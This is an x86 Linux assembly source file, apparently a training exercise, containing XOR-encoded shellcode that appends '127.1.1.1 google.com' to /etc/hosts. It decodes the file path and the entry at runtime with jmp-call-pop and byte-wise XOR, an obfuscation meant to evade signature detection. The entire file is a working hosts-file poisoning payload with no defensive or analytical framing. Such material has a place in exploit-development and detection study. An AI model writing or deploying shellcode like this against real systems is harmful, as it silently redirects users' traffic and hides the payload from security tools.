global _start

section .text

_start:
    xor ecx,ecx		;ecx=0
    mul ecx		;eax=0
    mov edx,ecx         ;edx=0
    push 0x5;		;
    pop eax		;eax=5 id for open file
    push ecx            ;push eax=0 onto the stack: termination byte 
    push 0x47A2291B	; 0x7374736f xor 0x34d65a74 =47A2291B
    push 0x5CF9755B     ; 0x682f2f2f xor 0x34d65a74 =5CF9755B
    push 0x57A23F5B     ;0x6374652f xor 0x34d65a74 =57A23F5B
    
    mov esi, 0x34d65a74 
    xor dword [esp],esi   ;decode 
    xor dword [esp+4],esi ;decode
    xor dword [esp+8],esi ;decode
    mov ebx, esp	  ;save address of /etc///hosts in ebx
    mov cx, 0x401         ;permissions
    int 0x80              ;syscall to open file

    xchg eax, ebx	  ; saves file descriptor in ebx
    push 0x4              ;
    pop eax               ;eax=4 id for write file
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop esi		  ;esi get the adress of encoded entry google.com to 127.1.1.1
    xor cl,cl		  ;cl=0    	          
     begin_decoding:		
	xor byte [esi+edx],0xd1	;xor byte at esi+edx with 0xd1
        cmp byte [esi+edx], cl  ;if the byte at esi+edx is 0 after decoding,
        je end_decoding         ; then decoding is done, else
        inc edx			; increment edx
        jmp begin_decoding      ; go to the next byte
    end_decoding:
        mov ecx,esi
    push length         ;length of the string
    pop edx             ;edx=length
    int 0x80        	;syscall to write in the file
    push 6	        ;
    pop eax       	;eax=6
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax	    ;eax=1 id for exit
    int 0x80        ;syscall to exit

_load_data:
    call _write
    ;every byte of new_entry is decoded by xor 0xd1
    new_entry db 0xe0 ,0xe3 ,0xe6 ,0xff ,0xe0 ,0xff ,0xe0 ,0xff ,0xe0 ,0xf1 ,0xb6 ,0xbe ,0xbe ,0xb6 ,0xbd ,0xb4 ,0xff ,0xb2 ,0xbe ,0xbc,0xd1
    length equ $-new_entry-1
